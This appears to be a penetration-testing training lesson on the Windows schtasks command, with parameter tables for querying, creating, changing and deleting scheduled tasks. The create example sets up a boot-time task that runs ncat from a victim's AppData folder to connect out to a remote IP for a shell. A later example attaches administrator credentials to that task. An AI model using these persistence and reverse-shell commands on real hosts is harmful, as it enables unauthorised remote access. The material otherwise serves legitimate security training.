The Task Scheduler allows us as admins to perform routine tasks without having to kick them off manually. The scheduler will monitor the host for a specific set of conditions called triggers and execute the task once the conditions are met.

#### Triggers That Can Kick Off a Scheduled Task
- When a specific system event occurs.
- At a specific time.
- At a specific time on a daily schedule.
- At a specific time on a weekly schedule.
- At a specific time on a monthly schedule.
- At a specific time on a monthly day-of-week schedule.
- When the computer enters an idle state.
- When the task is registered.
- When the system is booted.
- When a user logs on.
- When a Terminal Server session changes state.
#### Display Scheduled Tasks:

#### Query Syntax

|**Action**|**Parameter**|**Description**|
|---|---|---|
|`Query`||Performs a local or remote host search to determine what scheduled tasks exist. Due to permissions, not all tasks may be seen by a normal user.|
||/fo|Sets formatting options. We can specify to show results in the `Table, List, or CSV` output.|
||/v|Sets verbosity to on, displaying the `advanced properties` set in displayed tasks when used with the List or CSV output parameter.|
||/nh|Simplifies the output using the Table or CSV output format. This switch `removes` the `column headers`.|
||/s|Sets the DNS name or IP address of the host we want to connect to. `Localhost` is the `default` specified. If `/s` is utilized, we are connecting to a remote host and must format it as "\\host".|
||/u|This switch will tell schtasks to run the following command with the `permission set` of the `user` specified.|
||/p|Sets the `password` in use for command execution when we specify a user to run the task. Users must be members of the Administrator's group on the host (or in the domain). The `u` and `p` values are only valid when used with the `s` parameter.|

We can view the tasks that already exist on our host by utilizing the `schtasks` command like so:
```cmd-session
C:\htb> SCHTASKS /Query /V /FO list
```

***
#### Create a New Scheduled Task:

#### Create Syntax

|**Action**|**Parameter**|**Description**|
|---|---|---|
|`Create`||Schedules a task to run.|
||/sc|Sets the schedule type. It can be by the minute, hourly, weekly, and much more. Be sure to check the options parameters.|
||/tn|Sets the name for the task we are building. Each task must have a unique name.|
||/tr|Sets the trigger and task that should be run. This can be an executable, script, or batch file.|
||/s|Specify the host to run on, much like in Query.|
||/u|Specifies the local user or domain user to utilize|
||/p|Sets the Password of the user-specified.|
||/mo|Allows us to set a modifier to run within our set schedule. For example, every 5 hours every other day.|
||/rl|Allows us to limit the privileges of the task. Options here are `limited` access and `Highest`. Limited is the default value.|
||/z|Will set the task to be deleted after completion of its actions.|

Creating a new scheduled task is pretty straightforward. At a minimum, we must specify the following:

- `/create` : to tell it what we are doing
- `/sc` : we must set a schedule
- `/tn` : we must set the name
- `/tr` : we must give it an action to take

Everything else is optional. Let us see an example below of how we could create a task to help us get a shell.

#### New Task Creation

```cmd-session
C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
```

***
### Change the Properties of a Scheduled Task

#### Change Syntax

|**Action**|**Parameter**|**Description**|
|---|---|---|
|`Change`||Allows for modifying existing scheduled tasks.|
||/tn|Designates the task to change|
||/tr|Modifies the program or action that the task runs.|
||/ENABLE|Change the state of the task to Enabled.|
||/DISABLE|Change the state of the task to Disabled.|

Ok, now let us say we found the `hash` of the local admin password and want to use it to spawn our Ncat shell for us; if anything happens, we can modify the task like so to add in the credentials for it to use.

```cmd-session
C:\htb> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
```

***
### Delete the Scheduled Task(s)

#### Delete Syntax

|**Action**|**Parameter**|**Description**|
|---|---|---|
|`Delete`||Remove a task from the schedule|
||/tn|Identifies the task to delete.|
||/s|Specifies the name or IP address to delete the task from.|
||/u|Specifies the user to run the task as.|
||/p|Specifies the password to run the task as.|
||/f|Stops the confirmation warning.|

```cmd-session
C:\htb> schtasks /delete  /tn "My Secret Task" 

WARNING: Are you sure you want to remove the task "My Secret Task" (Y/N)?
```

Running `schtasks /delete` is simple enough. The thing to note is that if we do not supply the `/F` option, we will be prompted, like in the example above, for you to supply input. Using `/F` will delete the task and suppress the message.

Schtasks can be a great way to leverage the host to run actions for us as admins and pentesters. Take some time to practice creating, modifying, and deleting tasks. By now, we should be comfortable with `cmd.exe` and its workings. Let's level up and start working in `PowerShell`!